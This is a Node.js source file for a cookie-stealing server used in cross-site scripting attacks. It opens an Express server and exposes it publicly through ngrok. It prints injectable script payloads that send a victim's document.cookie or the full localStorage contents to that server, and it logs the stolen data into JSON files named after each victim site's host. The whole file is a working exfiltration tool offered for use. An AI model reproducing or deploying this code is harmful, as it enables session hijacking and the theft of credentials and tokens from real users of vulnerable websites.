const ip = require('ip').address()
const ngrok = require('ngrok')
const express = require('express')
const bodyP = require('body-parser')
const app = express()
const ora = require('ora')
const spinner = ora('')

exports.start = async (port) => {
    port = process.env.port || port

    app.use(bodyP.json())
    app.use(bodyP.urlencoded({ extended: true, limit: '50mb' }))
    
    app.get('/cookie', async (req, res) => {
        let { query } = req.query
        spinner.start()
        spinner.color = 'yellow'
        spinner.text = `Runing XSS on ${req.headers.referer}...`

        let finish = await succeed()
        if (finish) {
            let name = req.headers.referer.replace('http://', '')
            name = name.substring(0, name.indexOf('/'))
            await saveFile({ folder: name, name: `cookie`, data: query })
        }
    })

    app.get('/localstorage', async (req, res) => {
        let { query } = req.query
        spinner.start()
        spinner.color = 'yellow'
        spinner.text = `Runing XSS on ${req.headers.referer}...`

        let finish = await succeed()
        if (finish) {
            let name = req.headers.referer.replace('http://', '')
            name = name.substring(0, name.indexOf('/'))
            await saveFile({ folder: name, name: `localstorage`, data: query })
        }
    })
    
    app.listen(port, async () => {
        spinner.succeed('Server started')
        const pURL = await ngrok.connect({ proto: 'http', addr: port })

        spinner.info(`local: http://${ip}:${port}`)
        spinner.info(`public: ${pURL}`)
        // urls
        console.log('\r\n\r\n')
        spinner.info(`Get Cookie: \r\n<script>new Image().src = "${pURL}/cookie?query=" + document.cookie</script>\r\n<script>new Image().src = "${pURL}/cookie?query=" %2B document.cookie</script>\r\n`)
        spinner.info(`Get Localstorage: \r\n<script>if ('localStorage' in window && window['localStorage'] !==null){new Image().src='${pURL}/localstorage?query='+JSON.stringify(window['localStorage']);}</script>\r\n<script>if ('localStorage' in window && window['localStorage'] !==null){new Image().src='${pURL}/localstorage?query=' %2B JSON.stringify(window['localStorage']);}</script>\r\n`)
    })
}

async function saveFile({ folder, name, data }) {
    const fs = require('fs')
    const path = require('path')
    let file = path.join(__dirname + `/../outputs/${folder}/${name}.json`)
    let filepath = path.join(__dirname + `/../outputs/${folder}`)
    const fileExists = await fs.existsSync(file)

    if (!await fs.existsSync(filepath)) {
        await fs.mkdirSync(filepath)
    }
    if (!fileExists) {
        try {            
            let date = new Date
            await fs.writeFileSync(file, JSON.stringify([{ [`log-${date}`] : data }]))
            return spinner.info(`File created at: ${file}\r\n`)
        } catch(e) {
            return spinner.fail(`${e}\r\n`)
        }
    }

    if (fileExists) {
        let log = require(file)
        let date = new Date
        log.push({ [`log-${date}`] : data })
        try {
            await fs.writeFileSync(file, JSON.stringify(log))
            return spinner.info(`File updated at: ${file}\r\n`)
        } catch(e) {
            return spinner.fail(`${e}\r\n`)
        }
    }
}

async function succeed() {
    return new Promise((resolve, reject) => {
        setTimeout(() => {
            spinner.succeed()

            return resolve(true)
        }, 3000);
    })
}